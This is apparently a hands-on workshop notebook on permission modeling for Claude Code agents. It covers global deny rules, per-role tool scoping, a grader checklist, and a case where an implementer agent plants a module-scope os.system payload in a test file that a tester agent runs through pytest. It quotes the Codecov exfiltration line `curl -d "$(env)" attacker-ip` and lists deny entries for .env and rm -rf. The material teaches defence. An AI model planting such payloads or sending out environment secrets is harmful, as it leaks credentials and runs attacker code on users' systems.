# Day 2 · Module 2: Permission Modeling

**Objective:** configure permissions so you can answer: **"What is this agent allowed to do, what is impossible, and what can still slip through?"**

You will use two controls together: a global `settings.json` deny list (blast-radius floor for everyone) and per-role `tools:` scoping (least privilege per agent).

## Relevant Claude Code Docs
Review these before starting the module:
- [Choose a permission mode](https://code.claude.com/docs/en/permission-modes)
- [Configure permissions](https://code.claude.com/docs/en/permissions)
- [Configure permissions (Agent SDK)](https://code.claude.com/docs/en/agent-sdk/permissions)

## 1 · The idea

Claude Code gives you two independent levers for bounding what an agent can do:

- **Global deny (`permissions.deny` in `.claude/settings.json`)** applies to every agent in the project. It is a blast-radius floor: if denied globally, nobody gets it.
- **Per-role `tools:` scoping (in each agent's frontmatter)** is least privilege per role. Give each role only what it needs, not what it might someday use.

Both levers are real, enforced controls. They reduce accidental and obvious misuse immediately.

But both share a blind spot: they control **tool calls**, not all **downstream consequences** of content that gets written and later executed.

That is why this module matters: permission modeling is necessary, but not sufficient, for pipeline safety.

### Why this helps (and why it is not enough)

For first-time agent teams, this module gives immediate wins:
- You can block high-risk actions everywhere with one deny rule.
- You can prevent role confusion (for example, "reader" agents editing files).
- You can make policy violations obvious and testable.

But it also teaches an important limit:

**safe tool call + unsafe content + later execution = incident**

So the goal is not "permissions solve security." The goal is:
1. use permissions to reduce obvious risk now,
2. document what survives,
3. hand surviving risk to stronger controls (Module 3 sandboxing).

### Grounding

Read `reference/day2/m2/agents/implementer.md` and `reference/day2/m2/agents/tester.md`.

- Implementer has `Read, Edit, Write` (no `Bash`).
- Tester has `Bash(uv run pytest)`.

At first glance this looks safe: implementer cannot run shell commands directly.

Now follow the chain:
1. Implementer writes `tests/test_reporting.py`.
2. File includes module-scope payload like `os.system("...")`.
3. Tester runs `uv run pytest` (allowed action).
4. Pytest collection imports test modules.
5. Import executes module-scope code before assertions.

No role broke its declared permissions. The pipeline still executed attacker-controlled shell behavior.

Key lesson: permissions scoped to tool calls cannot inspect all file content or block all later execution paths. That surviving gap is why Module 3 introduces sandboxing.

### Real-world permission bypasses — why config alone fails

Config gates *tool calls*, not file *contents* or *exfiltration channels*. Study these documented attacks where permissions were correctly scoped, but the breach happened anyway.

#### 1. Codecov Bash Uploader (April 2021) — Read permission, exfiltration channel
- **Tool scoped to:** Read environment variables (legitimate, needed for configuration)
- **Bypass:** One line added to the script: `curl -d "$(env)" attacker-ip`. Tool read environment *with permission*; exfiltrated it *without permission being able to stop it*.
- **Why config failed:** Permission model allows "read env"; doesn't restrict "send env to attacker." Same tool capability; different consequence.
- **Duration:** 61 days. **23,000+ customers leaked secrets** (API keys, database passwords, cloud tokens).
- **Permission-modeling lens:** Per-role `tools:` scoping said "this tool can read environment." That was legitimate. Config can't separate "read for configuration" from "read for exfiltration."

#### 2. TrapDoor / TeamPCP (2024) — Installer permission, startup-time execution
- **Tool scoped to:** Run setup/install scripts (legitimate, packages need to configure themselves)
- **Bypass:** Setup scripts inject `.pth` hooks (Python) that execute on *every interpreter startup* before user code runs. Hooks steal secrets from the entire build environment.
- **Why config failed:** Permission model allows "installer can run setup"; doesn't restrict "setup code runs at interpreter startup with full env access." Setup runs before the user's code; it sees all secrets.
- **Scale:** **384 malicious artifacts** across 34 npm/PyPI packages. Every customer who installed pulled stealers into their build environment.
- **Permission-modeling lens:** Per-role `tools:` scoping said "this tool can run install scripts." That was legitimate. Config can't prevent setup code from running before user code or from stealing secrets.

#### 3. 3CX Build System (March 2023) — Permissions granted by identity, not behavior
- **Access scoped to:** Developer account with build-system access (legitimate, developers build and sign)
- **Bypass:** Compromised developer account used to poison Windows and macOS builds, sign with legitimate certificates, ship to all customers.
- **Why config failed:** Permission model allows "this developer can build and sign." That was legitimate. Config can't distinguish "legitimate build" from "trojanized build." Both use the same tools, the same permissions.
- **Impact:** All customers trusting 3CX's signature installed malware.
- **Permission-modeling lens:** Per-role `tools:` scoping said "this developer can run build." Granting permissions based on identity is blind to behavior. Config can't see *what gets built*.

#### 4. XZ Utils Backdoor (CVE-2024-3094, March 2024) — Trust-chain attack
- **Access scoped to:** Maintainer with commit access (legitimate, they maintain the library)
- **Bypass:** After 2 years building trust, attacker embedded backdoor in binary test files (invisible in source diffs). When other packages linked liblzma transitively, the backdoor loaded into unrelated services (sshd).
- **Why config failed:** Permission model allows "this maintainer can commit." That was legitimate. Config can't inspect *what's hidden in binary test files* or restrict *where transitive dependencies get loaded*.
- **Permission-modeling lens:** Per-role `tools:` scoping says "this role can write source." Config can't see file *contents* or *binary payloads*.

**Common pattern:** Each attack used legitimate permissions. Each permission scope was correctly configured. None were stopped by config because:
- Exfiltration channels aren't gated by tool permissions
- Setup/startup-time code isn't gated by when user code runs
- Behavior can't be distinguished from legitimate behavior based on permissions alone
- File *contents* and *binary payloads* aren't visible to config

This is why permissions alone — no matter how tight — can't prevent the implementer→tester chain you'll test in this exercise. File content reach crosses the permission boundary. Closing it requires sandboxing (M3).

### Setup check

Run the cell below once per session. It makes sure `contoso` is importable and prints the resolved project root — you'll need `proj` later for the self-check.


In [ ]:
import subprocess, sys, os
# Ensure src is importable and the sandbox is healthy before you start.
os.chdir(os.path.dirname(os.getcwd())) if os.path.basename(os.getcwd()) in ("day1","day2") else None
root = subprocess.run(["git","rev-parse","--show-toplevel"], capture_output=True, text=True)
proj = root.stdout.strip() or os.path.abspath(os.path.join(os.getcwd(), "..", ".."))
sys.path.insert(0, os.path.join(proj, "src"))
print("project root:", proj)
try:
    import contoso
    print("contoso imported OK:", contoso.__name__)
except Exception as e:
    print("Could not import contoso:", e)
    print("Run `uv sync` in the repo root, then restart the kernel.")

project root: /Users/kevinbooth/anthropic/claude_code_advanced_workshop/claude-code-workshop
contoso imported OK


## 2 · Your exercise

Work through these steps in order:

1. Copy `reference/day2/m2/agents/explorer.md`, `critic.md`, `implementer.md`, and `tester.md` into `.claude/agents/` (create it if missing).
2. Open `.claude/settings.json` and extend `permissions.deny` with justified entries of your own. Keep the Day 1 baseline (`.env`, `.env.*`, `git push`, `rm -rf`) and add to it.
3. Re-read each copied agent file's `tools:` line. Confirm read-only roles (explorer, critic) do not have `Write`, `Edit`, or `Bash`.
4. Run at least four adversarial permission attempts and record what happened:
   - Explorer attempts to edit a file.
   - Implementer attempts to run a shell command directly.
   - Tester attempts to edit under `src/`.
   - Attempt to read a deny-listed path (for example `.env`).
5. Record results in `artifacts/day2/m2/permission-model.md` including:
   - blocked/allowed/confusing result,
   - which lever caught it (global deny, per-role `tools:`, or neither),
   - one sentence on likely business impact if it had succeeded.

Keep row 4 focused on the grounding bypass: implementer-writes/tester-executes survives config-only controls.

### Results table

Start `artifacts/day2/m2/permission-model.md` from this exact skeleton — one row per attempt, comparable across the room. Row 4 is the grounding example's surviving bypass; it is pre-filled because no amount of `tools:` scoping or global deny stops it — your job for that row is to name *why*, not to find a fix.

| # | Attempt (what the agent tried) | Mechanism (tool/action) | Blocked? | Which lever caught it |
|---|--------------------------------|--------------------------|----------|------------------------|
| 1 | | | yes/no | global deny / per-role `tools:` / neither |
| 2 | | | | |
| 3 | | | | |
| 4 | implementer writes a `tests/` file with a module-scope `os.system(...)`; tester imports and runs it via `uv run pytest` | file content → executed at pytest collection | **NO** | neither (bypass — closes only with sandboxing, Module 3) |

Fill in rows 1–3 from your own four adversarial attempts above. For each, name the specific mechanism (which tool call was attempted, or which file path), whether it was blocked, and which lever caught it — the global deny list, the agent's own `tools:` scoping, or neither.


### What good looks like

A strong writeup:
- Shows four concrete attempts with outcomes.
- Correctly identifies whether global deny, role `tools:`, or neither blocked each one.
- Explicitly states that the implementer-writes/tester-executes chain survives this module's controls.
- Hands that surviving risk to sandboxing (Module 3) instead of claiming it is fixed.
- Includes a plain-language business impact sentence per attempt.

Common failure mode: assuming per-role `tools:` scoping blocks the implementer→tester chain. It does not. Each stage can remain within allowed tools while file content crosses stage boundaries and executes later.

### Verify your work

This checklist is advisory, not a gate — it just reflects back what it finds in `.claude/settings.json`, `.claude/agents/`, and `artifacts/day2/m2/`. Run it any time; it's safe to run before you've written anything.


In [2]:
import json, pathlib

proj_p = pathlib.Path(proj)

# 1. Global deny baseline in .claude/settings.json.
s = proj_p / ".claude" / "settings.json"
if s.exists():
    try:
        deny = json.loads(s.read_text()).get("permissions", {}).get("deny", [])
    except Exception:
        deny = []
    d = " ".join(deny).lower()
    print("[x] settings.json present")
    for entry in (".env", ".env.*", "git push", "rm -rf"):
        print(f"  [{'x' if entry.lower() in d else ' '}] denies {entry}?")
else:
    print("[ ] .claude/settings.json missing")

# 2. All four reference agents present, each with a tools: line.
agents = proj_p / ".claude" / "agents"
required = ("explorer.md", "critic.md", "implementer.md", "tester.md")
present = {}
for name in required:
    f = agents / name
    body = f.read_text() if f.exists() else ""
    present[name] = f.exists() and "tools:" in body
    print(f"[{'x' if present[name] else ' '}] {name} present with a tools: line")
if sum(present.values()) != 4:
    print("[ ] FAIL: expected all 4 agents present — copy the missing ones from reference/day2/m2/agents/")


def _tools_line(name):
    f = agents / name
    if not f.exists():
        return ""
    body = f.read_text()
    fm = body.split("---")[1] if body.count("---") >= 2 else ""
    for line in fm.splitlines():
        if line.strip().startswith("tools:"):
            return line.split(":", 1)[1]
    return ""


# 3. Read-only roles carry no Write/Edit/Bash; tester is scoped to Bash(uv run pytest) only.
for name in ("explorer.md", "critic.md"):
    tl = _tools_line(name)
    ro = bool(tl) and "Write" not in tl and "Edit" not in tl and "Bash" not in tl
    print(f"[{'x' if ro else ' '}] {name} tools: line carries no Write/Edit/Bash -> {tl.strip()!r}")

tester_tl = _tools_line("tester.md")
tester_scoped = "Bash(uv run pytest)" in tester_tl
print(f"[{'x' if tester_scoped else ' '}] tester.md scoped to Bash(uv run pytest) -> {tester_tl.strip()!r}")

# 4. Writeup names the surviving content-bypass AND the sandbox (M3) handoff.
pm = proj_p / "artifacts" / "day2" / "m2" / "permission-model.md"
if pm.exists():
    t = pm.read_text().lower()
    has_attempts = t.count("|") >= 20
    names_bypass = ("module scope" in t or "module-scope" in t) and (
        "content" in t or "collection" in t
    )
    names_handoff = "sandbox" in t or "m3" in t
    print("[x] permission-model.md present")
    print(f"  [{'x' if has_attempts else ' '}] records the 4 attempts as a table?")
    print(f"  [{'x' if names_bypass else ' '}] names the module-scope/content bypass mechanism?")
    print(f"  [{'x' if names_handoff else ' '}] names the sandbox (M3) handoff?")
    if not (names_bypass and names_handoff):
        print(
            "  [ ] FAIL: a bare 'attempt 4 not blocked' is not enough — name the "
            "bypass mechanism and the sandbox handoff explicitly."
        )
else:
    print("[ ] artifacts/day2/m2/permission-model.md missing")


[x] settings.json present
  [x] denies .env?
  [x] denies .env.*?
  [x] denies git push?
  [x] denies rm -rf?
[x] explorer.md present with a tools: line
[x] critic.md present with a tools: line
[x] implementer.md present with a tools: line
[x] tester.md present with a tools: line
[x] explorer.md tools: line carries no Write/Edit/Bash -> 'Read, Grep, Glob'
[x] critic.md tools: line carries no Write/Edit/Bash -> 'Read, Grep, Glob'
[x] tester.md scoped to Bash(uv run pytest) -> 'Read, Write, Bash(uv run pytest)'
[x] permission-model.md present
  [x] records the 4 attempts as a table?
  [x] names the module-scope/content bypass mechanism?
  [x] names the sandbox (M3) handoff?


## 3 · Debrief

- Which controls belonged in global deny versus role-level `tools:` scoping, and why?
- Which attempt was blocked cleanly, and which was only partially blocked or confusing?
- Which surviving risk would you escalate first if this pipeline were shipping tomorrow?
- What exact sentence would you use to explain to a product lead why Module 3 is required after Module 2?

---
### Take-home

Permissions are real, enforced controls — they are not a documented intention like a threat-model row. But they are also scoped to *tool calls*, not to the downstream consequences of what gets written to disk. The implementer-writes/tester-executes bypass in this module's grounding is the clearest example: every individual tool call was within its role's permitted scope, and the pipeline still ran attacker-controlled code.

(Related concept: sandboxing bounds what the *code* can do once it runs, independent of which agent produced it — Module 3.)
